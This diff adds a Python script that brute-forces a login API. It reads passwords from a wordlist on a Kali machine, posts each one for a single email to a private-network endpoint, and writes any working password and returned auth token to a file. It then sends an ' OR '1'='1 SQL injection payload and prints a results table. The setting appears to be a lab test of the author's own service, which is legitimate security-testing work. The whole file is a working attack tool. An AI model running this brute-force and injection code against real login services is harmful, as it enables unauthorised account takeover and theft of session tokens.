@@ -1,0 +1,54 @@
+import requests
+import time
+
+url = "http://192.168.1.108:5196/api/Auth/login"
+email = "mnd@test.com"
+
+wordlist = "/home/kali/pass.txt"
+
+with open(wordlist, "r", errors="ignore") as f:
+    passwords = [line.strip() for line in f]
+
+start_time = time.time()
+attempts = 0
+results = []
+
+for pwd in passwords:
+    attempts += 1
+    data = {"email": email, "password": pwd}
+    response = requests.post(url, json=data)
+
+    if response.status_code == 200:
+        results.append(["SUCCESS", email, pwd, response.status_code])
+        end_time = time.time()
+
+        with open("results.txt", "w") as out:
+            out.write(f"Email: {email}\nPassword: {pwd}\n")
+            out.write(f"Token: {response.text}\n")
+            out.write(f"Attempts: {attempts}\n")
+            out.write(f"Time: {end_time - start_time:.2f} seconds\n")
+        break
+    else:
+        results.append(["FAIL", email, pwd, response.status_code])
+
+end_time = time.time()
+
+# SQL Injection test
+sql_payload = "' OR '1'='1"
+data = {"email": email, "password": sql_payload}
+resp = requests.post(url, json=data)
+
+if resp.status_code == 200:
+    results.append(["SQLi?", email, sql_payload, resp.status_code])
+    print("[!] Possible SQL Injection vulnerability detected!")
+else:
+    results.append(["SQLi FAIL", email, sql_payload, resp.status_code])
+
+# Print table-like results
+print(f"\n{'Result':<10}{'Email':<25}{'Password':<20}{'Status'}")
+print("-" * 70)
+for row in results:
+    print(f"{row[0]:<10}{row[1]:<25}{row[2]:<20}{row[3]}")
+
+print("\n[i] Total attempts:", attempts)
+print(f"[i] Execution time: {end_time - start_time:.2f} seconds")
